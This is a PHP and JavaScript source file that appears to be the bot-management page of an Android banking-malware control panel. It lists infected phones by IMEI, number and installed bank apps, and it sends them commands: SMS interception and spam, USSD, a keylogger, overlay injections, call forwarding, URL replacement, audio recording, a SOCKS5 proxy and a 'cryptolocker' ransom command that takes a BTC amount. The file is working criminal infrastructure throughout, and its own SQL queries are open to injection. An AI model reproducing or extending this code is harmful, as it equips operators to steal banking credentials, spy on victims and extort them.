<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>

	<div id="showAlert"></div>

<div class="content" id="content">

<script type="text/javascript">
//-------JS----------------

function getTextFileLogs(imei){

	$.ajax({
      url: 'application/get/logBot.php?imei='+imei,
      success: function(data) {
         $('#textArea').append('<textarea id="logsTextArea" readonly name="mesage"  wrap="virtual" class="textlog">'+data+'</textarea>');
      }
});
refreshIconLogBot(imei);
}

    function checkAll(checkId){

        var inputs = document.getElementsByTagName("input");
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i].type == "checkbox" && inputs[i].id == checkId) {
                if(inputs[i].checked == true) {
                    inputs[i].checked = false ;
                } else if (inputs[i].checked == false ) {
                    inputs[i].checked = true ;
                }
            }
        }
    }

	 function checkOFF(){
        var inputs = document.getElementsByTagName("input");
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i].type == "checkbox" && inputs[i].id == 'chk') {
                if(inputs[i].checked == true) {
                    inputs[i].checked = false ;
                }
            }
        }
    }


	function getOptSelectIMEI(){
		SelectOptionDeleteAllValues('comboBox_imeis');
		var imeis='';
			var inputs = document.getElementsByTagName("input");
			for (var i = 0; i < inputs.length; i++) {
				if (inputs[i].type == "checkbox" && inputs[i].id == 'chk'){
					if(inputs[i].checked == true){
						var arrayidimei = inputs[i].value.split(':',2);
						$('#comboBox_imeis').append($('<option>', {
							value: arrayidimei[0],
							text: arrayidimei[1]
						}));
						imeis=imeis+':'+arrayidimei[1];
					}
				}
			}
		$("#text_imei").val(imeis);
	}
	function SelectOptionDeleteAllValues(name){
        var listBox = document.getElementById(name);
        listBox.options.length = 0;
        return false;
    }

	function sendDataCommand(){
		var statusAlert=false;
		var value = document.getElementById("comboBox_commands").value;
		var imeis = document.getElementById("text_imei").value;

		if(value=="null"){

		}else if(value=="sentSMS"){
			var number = document.getElementById("text_number").value;
			var text = document.getElementById("text_msg").value;

			number = number.replace('+', '@');

			 $.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_number='+number
			   +'&text_msg='+ text,
			   cache: false});
			statusAlert=true;

		}else if(value=="startUSSD"){
			var text = document.getElementById("text_ussd").value;
			 text = text.replace("#","AAA");
			 text = text.replace("#","AAA");
			 text = text.replace("#","AAA");
			 text = text.replace("#","AAA");
			 $.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_ussd='+ text,
			   cache: false});
			statusAlert=true;
		}else if(value=="getSMS"){
			 $.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="ws"){
			var number = document.getElementById("text_ws").value;
			var text = document.getElementById("text_hs").value;

			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_ws='+number
			   +'&text_hs='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="getapps"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			statusAlert=true;
		}else if(value=="getpermissions"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startAlert"){
			var title = document.getElementById("title_push").value;
			var text = document.getElementById("text_push").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&title_push='+title
			   +'&text_push='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startPush"){
			var title = document.getElementById("titlePush").value;
			var text = document.getElementById("textPush").value;
			var icon = document.getElementById("comboBox_push").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&titlePush='+title
			   +'&textPush='+ text
			   +'&comboBox_push=' + icon,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startAutoPush"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="getkeylogger"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startinj"){
			var inject = document.getElementById("comboBox_inj").value;

			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&comboBox_inj='+inject,
			   cache: false});
			   statusAlert=true;
		}else if(value=="numberGO"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="numberGOsendSMS"){
			var text = document.getElementById("text_sms_tel_book").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_sms_tel_book='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="RequestPermissionInj"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="RequestPermissionGPS"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startaccessibility"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startpermission"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startforward"){
			var text = document.getElementById("text_forward").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_forward='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="stopforward"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="openbrowser"){
			var text = document.getElementById("text_openbrowser").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_openbrowser='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="openactivity"){
			var text = document.getElementById("text_openactivity").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_openactivity='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="getIP"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="killBot"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startApp"){
			var app = document.getElementById("text_start_app").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&text_start_app='+ app,
			   cache: false});
			   statusAlert=true;
		}else if(value=="replaceURL"){
			var url = document.getElementById("text_replace_url").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&text_replace_url='+ url,
			   cache: false});
			   statusAlert=true;


		}else if(value=="cryptolocker"){
			var key = document.getElementById("text_enc_key").value;
			var amount = document.getElementById("text_amount").value;
			var btc = document.getElementById("text_btc").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&key='+ key
			   + '&amount='+amount
			   + '&btc='+btc,
			   cache: false});
			   statusAlert=true;

		}else if(value=="decryptolocker"){
			var key = document.getElementById("text_dec_key").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&key='+ key,
			   cache: false});
			   statusAlert=true;
		}else if(value=="recordsound"){
			var seconds = document.getElementById("text_seconds").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&seconds='+ seconds,
			   cache: false});
			   statusAlert=true;
		}else if(value=="spamsms"){
		 			var textspam = document.getElementById("text_spam_n").value;
		 			$.ajax({
		 			   url: 'application/set/commandBots.php?'
		 			   +'comboBox_commands='+value
		 			   +'&text_imei='+ imeis
		 			   + '&spam='+ textspam,
		 			   cache: false});
		 			   statusAlert=true;
			}else if(value=="startsocks5"){
			 		 			var texthost = document.getElementById("text_host_n").value;
								var textuser = document.getElementById("text_user_n").value;
								var textpass = document.getElementById("text_pass_n").value;
								var textport = document.getElementById("text_port_n").value;
			 		 			$.ajax({
			 		 			   url: 'application/set/commandBots.php?'
			 		 			   + 'comboBox_commands='+value
			 		 			   + '&text_imei='+ imeis
			 		 			   + '&host='+ texthost
									 + '&user='+ textuser
									 + '&pass='+ textpass
									 + '&port='+ textport,
			 		 			   cache: false});
			 		 			   statusAlert=true;
				}else if(value=="stopsocks5"){
					$.ajax({
						 url: 'application/set/commandBots.php?'
						 + 'comboBox_commands='+value
						 + '&text_imei='+ imeis,
						 cache: false});
						 statusAlert=true;
			 	}

		checkOFF();
		if(statusAlert){
			startNatif('success','The team was successfully added!');
		}else{
			startNatif('danger','Enter the correct command!');
		}
	}

//--------------

function getOptSelectIMEISettings(imei){
		SelectOptionDeleteAllValues('comboBox_imeis2');
		var imeis='';
		var statimei = false;
			var inputs = document.getElementsByTagName("input");
			for (var i = 0; i < inputs.length; i++) {
				if (inputs[i].type == "checkbox" && inputs[i].id == 'chk'){
					if(inputs[i].checked == true){
						var arrayidimei = inputs[i].value.split(':',2);
						$('#comboBox_imeis2').append($('<option>', {
							value: arrayidimei[0],
							text: arrayidimei[1]
						}));

						imeis=imeis+':'+arrayidimei[1];
						statimei=true;
					}
				}
			}
			if(!statimei){
				$('#comboBox_imeis2').append($('<option>', {
							value: 0,
							text: imei
						}));
				imeis=':'+imei;
			}
		$("#text_imei_set").val(imeis);

	getSettingsBot(imei);
	}

	function getSettingsBot(imei){
				// ------ Clear Form -------
				var inputsClear = document.getElementsByTagName("input");
				for (var i = 0; i < inputsClear.length; i++) {
					if (inputsClear[i].type == "checkbox" && inputsClear[i].id == 'check_set') {
						inputsClear[i].checked = false ;
					}
				}
				document.getElementById("chkinterceptSMS").checked = false;
				document.getElementById("chkhideSMS").checked = false;
				document.getElementById("chknetwork").checked = false;
				document.getElementById("chkgps").checked = false;
				document.getElementById("check_foreground").checked = false;
				document.getElementById("check_keylogger").checked = false;
				document.getElementById("check_record").checked = false;
				document.getElementById("lookscreen").checked = false;
				document.getElementById("id_seconds").value = '';

				$.ajax({url: 'application/get/settingsBot.php?imei='+imei,   success: function(data) {
				     var arrayData = data.split('|');
					 var seconds = arrayData[0];
					 var injections = arrayData[1].split('/');
					 var interceptSMS = arrayData[2];
					 var hideSMS = arrayData[3];
					 var network = arrayData[4];
					 var gps =  arrayData[5];
					 var status =  arrayData[6];
					 var foreground = arrayData[7];
					 var keylogger = arrayData[8];
					 var check_record = arrayData[9];
					 var text_seconds = arrayData[10];
					 var lookscreen = arrayData[11];

					if(status!=null){
						 if(status==1){
							document.getElementById("AstatusSettings").style.color='red';
							document.getElementById("statusSettings").innerHTML="Settings are not active, wait until the bot updates them..";
						 }else{
							document.getElementById("AstatusSettings").style.color='#00FF00';
							document.getElementById("statusSettings").innerHTML="Settings are active!";
						 }
					}

				   if(seconds!=null){
						document.getElementById("idSeconds").innerHTML=seconds;
				   }

				    var inputs = document.getElementsByTagName("input");
					for(var j = 1; j < injections.length; j++){
						for (var i = 0; i < inputs.length; i++) {
							if (inputs[i].type == "checkbox" && inputs[i].id == 'check_set' && inputs[i].value == injections[j]) {
								inputs[i].checked = true ;
							}
						}
					}

					if(interceptSMS==1){
						  document.getElementById("chkinterceptSMS").checked = true;
					}
					if(hideSMS==1){
						 document.getElementById("chkhideSMS").checked = true;
					}
					if(network==1){
						document.getElementById("chknetwork").checked = true;
					}
					if(gps==1){
						document.getElementById("chkgps").checked = true;
					}
					if(foreground==1){
						document.getElementById("check_foreground").checked = true;
					}
					if(keylogger==1){
						document.getElementById("check_keylogger").checked = true;
					}
					if(check_record==1){
						document.getElementById("check_record").checked = true;
					}

					if(text_seconds!=null){
						document.getElementById("id_seconds").value = text_seconds;
					}
					if(lookscreen==1){
						document.getElementById("lookscreen").checked = true;
					}
			}});
	}

	function saveSetting(){
		var getImeis = document.getElementById("text_imei_set").value;

		var injections = '';
		var inputs = document.getElementsByTagName("input");
		for (var i = 0; i < inputs.length; i++) {
			if (inputs[i].type == "checkbox" && inputs[i].id == 'check_set' && inputs[i].checked == true) {
				injections = injections + '/' + inputs[i].value;
			}
		}
		var chkinterceptSMS = 0;
		if(document.getElementById("chkinterceptSMS").checked==true){
			chkinterceptSMS = 1;
		}

		var chkhideSMS = 0;
		if(document.getElementById("chkhideSMS").checked==true){
			chkhideSMS = 1;
		}

		var chknetwork = 0;
		if(document.getElementById("chknetwork").checked==true){
			chknetwork = 1;
		}

		var chkgps = 0;
		if(document.getElementById("chkgps").checked==true){
			chkgps = 1;
		}

		var foreground = 0;
		if(document.getElementById("check_foreground").checked==true){
			foreground = 1;
		}

		var keylogger = 0;
		if(document.getElementById("check_keylogger").checked==true){
			keylogger = 1;
		}

		var check_record = 0;
		if(document.getElementById("check_record").checked==true){
			check_record = 1;
		}

		var text_seconds = document.getElementById("id_seconds").value;

		var lookscreen = 0;
		if(document.getElementById("lookscreen").checked==true){
			lookscreen = 1;
		}

		$.ajax({ url: "application/set/settingsBots.php?text_imei_set="+ getImeis +"&check_set="+ injections +"&chknetwork="+chknetwork+"&chkgps="+chkgps+"&chkinterceptSMS="+chkinterceptSMS+"&chkhideSMS="+chkhideSMS+"&foreground="+foreground+"&keylogger="+keylogger+"&check_record="+check_record+"&text_seconds="+text_seconds+"&lookscreen="+lookscreen,
			   cache: false});

		startNatif('success','Successfully saved settings!');
	}
	//--------------Комментарии

	function saveComments(imei){
		var getComment = document.getElementById('comment'+imei).value;
		$.ajax({url: 'application/set/commentBot.php?imei='+imei+'&comment='+getComment});
		startNatif('success','Comments saved successfully!');
		refreshContentTable();
	}


</script>

</br>


 <table class="table table-hover table_dark" id="bootstrap-table">
 <thead class="header_table_bots">
 <tr>
 <?php
	 if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
			echo "<th><input type='checkbox' id='chk_new'  onclick=checkAll('chk'); />";
	 }elseif($_SESSION['panel_right']=="traffic")
	 {
		 	echo "<th></th>";
	 }
		echo "<th><i class='fa fa-user-circle-o fa-lg'/></th>";
		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<th><a title='Operator'><img src='images/icons/table/Operator.png' width='25px'/></a></th>";
		}
		echo "<th><a title='Android'><img src='images/icons/table/Android.png' width='25px'/></a></th>";
		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<th><a title='Tag'><img src='images/icons/table/tag.png' width='25px'/></a></th>";
		}
		echo "<th><a title='Country'><img src='images/icons/table/Country.png' width='25px'/></a></th>";
		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<th><a title='Banking App'><img src='images/icons/table/Bank.png' width='25px'/></a></th>";

		echo "<th><i class='fa fa-comment fa-lg'/></th>";
		}
		echo "<th><i class='fa fa-exchange fa-lg'/></th>";
		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<th><i class='fa fa-cogs fa-lg'/></th>";
		}
			echo "<th><i class='fa fa-calendar-plus-o  fa-lg'/></th>";
		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<th><i class='fa fa-terminal  fa-lg'/></th>";
		}
		?>
 </tr>
 </thead>

<?php
		include 'crypt.php';

		$count_id_page=0;
		$page = $_GET["page"];
		$page1 = $_GET["page"];
		$count_id = 30;

		global $log_IMEI;
		global $set_IMEI;

		//---------Читаем с файла сортировку---
		if(isset($_POST["bth_add_sort"]))
		{
			$_SESSION['sort_kat']=$_POST['sort_kat'];
			$_SESSION['sortCountry']=$_POST['sortCountry'];
			$_SESSION['color']=$_POST['color'];
			$_SESSION['versions']=$_POST['versions'];
			$_SESSION['bank']=$_POST['bank'];
			$_SESSION['packBank']=$_POST['packBank'];;
		}

		$sostoya = $_SESSION['sort_kat'];
		$countr = $_SESSION['sortCountry'];
		$colors = $_SESSION['color'];
		$ver_apk = $_SESSION['versions'];
		$banks = $_SESSION['bank'];
		$packBanks = $_SESSION['packBank'];

		if($sostoya!="all" || $countr!="all" || $colors!="all" || $ver_apk!="all" || $banks!="all" || $packBanks!="all")
		{
			$count_id = 10000000000000;
		}


		if($page =="" || $page == "1")
		{
			$page=0;
		}
		else
		{
			$page = ($page*$count_id)-$count_id;
		}

		/****Ограничение по тегам****/
		$userRights = new users_right;
		$tags = explode("|", $userRights->getPrivateTags());
		$thisTag = explode(",", $tags[0]);
		$thisTag = array_diff($thisTag, array("", NULL, false));
		$thisTagStr = implode("','", $thisTag);
		$thisTagStr="'$thisTagStr'";
		$privateTag = explode(",", $tags[1]);
		/****************************/

		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
        $connection->exec('SET NAMES utf8');

		if($_SESSION['panel_right']!="admin"){
			if($thisTagStr=="''"){
				$statement = $connection->prepare("SELECT * FROM kliets limit $page,$count_id");
			}else{
				$statement = $connection->prepare("SELECT * FROM kliets WHERE version_apk IN ($thisTagStr) limit $page,$count_id");
			}
		}else{
			 $statement = $connection->prepare("SELECT * FROM kliets limit $page,$count_id");
		}

		$booleanIMEI = false;

		if(isset($_POST["delete"]))//*****Обработка запросa Для удаления!
		{
			if (preg_match("/checks/",print_r($_POST,true)))
			{
				foreach($_POST["checks"] as $id)
				{
					$id_del = explode(":", $id);
					$sql2 = "DELETE FROM kliets WHERE id='".$id_del[0]."'";
					$connection->query($sql2);
				}
			}
		}

		//******батоны и переменые с базы!********

	    echo "<form name='callback' method='post'>";

		if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
		echo "<input type='submit' value='Add Сommand' onclick='getOptSelectIMEI()' name='add_commands' data-toggle='modal' data-target='.modal_command'  style='margin-left:1.5%;' class='btn btn-outline-success  '/>";
		echo "<input type='submit' value='Delete' name='delete' style='margin-left:5px;' class='btn btn-outline-danger'/>";
		echo "<input type='submit' value='Sorting' name='sorting' data-toggle='modal' data-target='.sorting' style='margin-left:5px;' class='btn btn-outline-secondary'/>";
		echo "<input type='submit' value='Refresh' name='refresh' style='margin-left:5px;' class='btn btn-outline-secondary'/>";
		}else
		{
			echo "<input type='submit' value='Refresh' name='refresh' style='margin-left:1.5%;' class='btn btn-outline-secondary'/>";
		}

		$statement->execute([$page]);
		$statement->execute([$count_id]);

		$count_bots = 0;
		$AllIMEI = '';
		foreach($statement as $row)
		{
			$ID = $row['id'];
			$IMEI = $row['IMEI'];
			$ip = $row['ip'];
			$number = $row['number'];
			$version = $row['version'];
			$version_apk = $row['version_apk'];
			$country = $row['country'];
			$bank = $row['bank'];
			$AV=$row['av'];
			$model = $row['model'];
			$lastConnect = $row['lastConnect'];
			$firstConnect = $row['firstConnect'];
			$l_inj=$row['inj'];
			$l_bank=$row['l_bank'];
			$l_log=$row['log'];
			$root=$row['r00t'];
			$screen=$row['screen'];
			$color=$row['color'];
			$requestInjProc=$row['requestInjProc'];
			$requestGeoloc=$row['requestGeoloc'];
			$requestSMS=$row['requestSMS'];
			$requestAccessibility=$row['accessibility'];
			$requestPlayProtect=$row['playprotect'];
			$doze=$row['doze'];
			$step=$row['step'];

			if($step=="")$step="0";

			$AllIMEI = "$AllIMEI:$IMEI";

			//******Получаем иконку состояния бота, вычисляем дату****
			$arr_data_from = explode(" ", $row['lastConnect']);
			$arr_data_till = explode(" ", date('Y-m-d H:i'));

			$date_from = $arr_data_from[0];
			$date_till = $arr_data_till[0];

			$date_from = explode('-', $date_from);
			$date_till = explode('-', $date_till);

			$time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
			$time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);

			$day = ($time_till - $time_from)/60/60/24; //получаем разницу кол-во дней!
			//----------Секунды!-------/
			$date1 = new \DateTime($row['lastConnect']);
			$date2 = new \DateTime(date('Y-m-d H:i'));
			$diff = $date2->diff($date1);
			// разница в секундах
			$seconds = ($diff->y * 365 * 24 * 60 * 60) + //получаем разницу в секундах!
			($diff->m * 30 * 24 * 60 * 60) +
			($diff->d * 24 * 60 * 60) +
			($diff->h * 60 * 60) +
			($diff->i * 60) +
			$diff->s;
			//----------обработка состояние иконки on/off-------/
			if($day>=2)//Дни!
			{
				$img="images/icons/kill.png";
				$getSortON_OFF="kill";
			}
			else
			{
				if($seconds<=120)
				{$img="images/icons/online.png";
				$getSortON_OFF="online";}
				else
				{$img="images/icons/offline.png";
				$getSortON_OFF="offline";}
			}
			//************Иконки ЛОГОВ***************************************
			if($l_inj == "1")
			{$icon_inj="images/icons/inj_on.png";}
			else
			{$icon_inj="images/icons/inj_off.png";}

			if($l_bank == "1")
			{$icon_bank="images/icons/bank_on.png";}
			else
			{$icon_bank="images/icons/bank_off.png";}

			if($l_log == "1")
			{$icon_log="images/icons/log_on.png";}
			elseif($l_log == "2")
			{$icon_log="images/icons/log_on_g.png";}
			else
			{$icon_log="images/icons/log_off.png";}

			/**/
			if($root == "1")
			{$icon_root="images/icons/V.png";}
			else
			{$icon_root="images/icons/X.png";}

			if($seconds<=120)
			{
				if($screen == "1")
				{$icon_screen="images/icons/V.png";}
				else
				{$icon_screen="images/icons/X.png";}
			}
			else
			{
				$icon_screen="images/icons/X.png";
			}

			if($requestInjProc == "1")
			{$icon_requestInjProc="images/icons/inj_v.png";}
			else
			{$icon_requestInjProc="images/icons/inj_off2.png";}

			if($requestGeoloc == "1")
			{$icon_requestGeoloc="images/icons/geolocation_v.png";}
			else
			{$icon_requestGeoloc="images/icons/geolocation_x.png";}

			if($requestSMS == "1")
			{$icon_requestSMS="images/icons/sms_v.png";}
			else
			{$icon_requestSMS="images/icons/sms_x.png";}

			if($requestAccessibility == "1")
			{$icon_Accessibility="images/icons/juk_v.png";}
			else
			{$icon_Accessibility="images/icons/juk_x.png";}

			if($requestPlayProtect == "1")
			{$icon_PlayProtect="images/icons/playprotect_on.png";}
			elseif($requestPlayProtect == "0")
			{$icon_PlayProtect="images/icons/playprotect_off.png";}
			else{
			$icon_PlayProtect="images/icons/playprotect_non.png";
			}

			$doze_icon = "images/icons/doze_green.png";
			$doze_title = "ON";
			if($doze=="1"){
				$doze_icon = "images/icons/doze_red.png";
				$doze_title = "OFF";
			}

			//----страны

			if($country == "") $country = "not";

			$country =  mb_strtolower($country);
			//************Данные в таблице********************************************
			// зел #00cc05;
			// red #d60000
			// син #0004d6
			// фил #ca00d6
			// желт #ffb305



			//******************Обработка банка********
			$number = str_replace(")",")</br>",$number);
			$model = str_replace(" (","</br>(",$model);
			$firstConnect= str_replace(" ","</br>",$firstConnect);

			//*****************************************

			$ver_apk = $_SESSION['versions'];
			$bankSession = $_SESSION['bank'];
			$packBanks = $_SESSION['packBank'];

			if($sostoya == "" || $sostoya == "all" || $sostoya == $getSortON_OFF)
			{
				if($countr == "" || $countr == "all" || $countr == $country)
				{
					if($colors == "" || $colors == "all" || ($colors == "cards" && $l_bank == "1")|| ($colors == "inject" && $l_inj == "1"))
					{
						if($ver_apk == "" || $ver_apk == "all" || $ver_apk == $version_apk)
						{
							if($packBanks == "" || $packBanks == "all" || $packBanks == $bank || preg_match("/$packBanks/",$bank))
							{
							if(($bankSession == "") || ($bankSession == "all") || (($bankSession == "on") && (strlen($bank)>=4)) || (($bankSession == "off") && (strlen($bank)<=4)))
							{
			echo "<tr class='table_bots' id='table_bots' style='color: #A4A4A4;'>";
			$color_kom = "#A4A4A4";

			$bank=str_replace(",","</br>",$bank);
			$bank=str_replace(", ","</br>",$bank);

			if (($_SESSION['panel_right']=="admin")||($_SESSION['panel_right']=="user")){
				echo "
				<td><input type=checkbox name=checks[]  id='chk' value=$ID:$IMEI></input></td>
				<td>$IMEI</br>$ip</td>
				<td>$number</td>
				<td>$version</td>
				<td>$version_apk</td>
				<td><a title='$country' style='margin-top: -4%;'><img src='images/country/$country.png' width='20px'/></a></td>
				<td>$bank</td>

				<td>
				<input type='text' name='comment$IMEI' id='comment$IMEI'  value='$AV' style='color: $color_kom; background: transparent; width: 83%; border: 0px solid #1D1F24;       padding: 5px;   font-family: 'Consolas';   font-size: 14px;     height: 28px;'/>
				<button class='btn_log' style='background: transparent; margin-left: -10px;' onclick='saveComments(\"$IMEI\")' data-toggle='modal'  name='kom_save' value='$IMEI' title='Save' ><img src='images/icons/save.png'  title='Save' alt='img' width='18px' style='padding-left: 0px' class='img_log' /></button>
				</td>";


				echo "<td>";
				echo getTimeConnect($row['lastConnect']);
				echo "</td>";


				echo "<td>
				<a title='Doze Mode $doze_title'><img id='doze$IMEI' src=$doze_icon width='18px'/></a>
				<a title='Google Play Protect'><img id='PlayProtect$IMEI' src=$icon_PlayProtect width='15px'/></a>
				<a title='Screen'><img id='Screen$IMEI' src=$icon_screen width='16px'/></a>
				<a title='Accessibility'><img id='Accessibility$IMEI' src=$icon_Accessibility width='20px'/></a>
				<a title='Hidden intercepting SMS'><img id='interceptingSMS$IMEI' src=$icon_requestSMS width='20px'/></a>
				<a title='Permission injections'><img id='injections$IMEI' src=$icon_requestInjProc width='20px'/></a>
				<a title='Permission geolocations'><img id='geolocations$IMEI' src=$icon_requestGeoloc width='20px'/></a>
				<a title='Steps'><img src=images/icons/step.png width='22px'/></a>
				<a style='margin-left: 5px'><span class='badge badge-dark' style='position:absolute; margin-top:-8px; margin-left:-16px;font-family: Times New Roman, Times, serif; font-size: 8px;'>
				$step
				</span></a>





				</td>
				<td>$firstConnect</td>
				<td>
				<a title='Cards'><img id='cards$IMEI' src=$icon_bank width='20px'/></a>
				<a title='Injections'><img id='inj$IMEI' src=$icon_inj width='20px'/></a>
			    <button class='btn_log' onclick='getTextFileLogs(\"$IMEI\")' data-toggle='modal' data-target='.logs' style='background: transparent;' name='click_log' value='$IMEI' title='Logs' ><img id='logs$IMEI' src='$icon_log' title='Logs' alt='img' width='18px' class='img_log'/></button>
				<button class='btn_log' onclick='getOptSelectIMEISettings(\"$IMEI\");'data-toggle='modal' data-target='.settings' style='background: transparent;' name='click_set' value='$IMEI' title='Settings' ><img src='images/icons/fe.png' title='Settings' alt='img' width='20px' class='img_log'/></button>
				</td>
				</tr>";




				$count_bots++;
			}elseif($_SESSION['panel_right']=="traffic")
			{
				$count_bots++;
				echo "
				<td>$count_bots</td>
				<td>$IMEI</td>
				<td>$version</td>
				<td><a title='$country' style='margin-top: -4%;'><img src='images/country/$country.png' width='20px'/></a></td>";

				echo "<td>";
				echo getTimeConnect($row['lastConnect']);
				echo "</td>";

				echo "<td>$firstConnect</td>
				</tr>";
			}

		}}}}}}
		}


		 echo "<input type='text' value='$AllIMEI' name='allimei' id='allimei' style='visibility:hidden'/>

		 </form>";



		//	id 	IMEI 	number 	version 	country 	bank 	model 	lastConnect 	firstConnect
		?>


 </table>


<script>
 $(document).ready( function () {
 $('#bootstrap-table').bdt();
 });
</script>

<?php

//НОМЕРА СТРАНИЦ
        $connection->exec('SET NAMES utf8');
		$sql2 ="";
		if($_SESSION['panel_right']!="admin"){

			if($thisTagStr == "''"){
				 $sql2 = "SELECT * FROM kliets";
			}else{
				 $sql2 = "SELECT * FROM kliets WHERE version_apk IN ($thisTagStr)";
			}
		}else{
			 $sql2 = "SELECT * FROM kliets";
		}


		foreach($connection->query($sql2) as $row)
			$count_id_page++;

		$b1="";
		$b2="";

	    $a = ceil($count_id_page/$count_id);
		echo "<center>";

		if($page1==1){
			if($a>1)echo "<a style='margin-left:5px; border: 1px solid #000' class='btn btn-default' href='index.php?cont=bots&page=1'>>1<</a>";
		}else{
			if($a>1)echo "<a style='margin-left:5px; border: 1px solid #000' class='btn btn-default' href='index.php?cont=bots&page=1'>1</a>";
		}

		for($b=2;$b<=$a-1;$b++)
		{
			if($page1==$b){
				$b1=">";
				$b2="<";
			}else{
				$b1="";
				$b2="";
			}

			if($a<=8){
				echo "<a style='margin-left:5px; border: 1px solid #000' class='btn btn-default' href='index.php?cont=bots&page=$b'>$b1$b$b2</a>";
			}
			if($a>8){
				if(($b>$page1-4)&&($b<$page1+4))
				echo "<a style='margin-left:5px; border: 1px solid #000' class='btn btn-default' href='index.php?cont=bots&page=$b'>$b1$b$b2</a>";
				if(($b==$a-1)&&($page1<($a-4))){
					echo "<a style='margin-left:5px; border: 1px solid #000' class='btn btn-default'>..</a>";
				}
				if(($b==2)&&($page1>5)){
					echo "<a style='margin-left:5px; border: 1px solid #000' class='btn btn-default'>..</a>";
				}
			}
		}
		if($page1==$a){
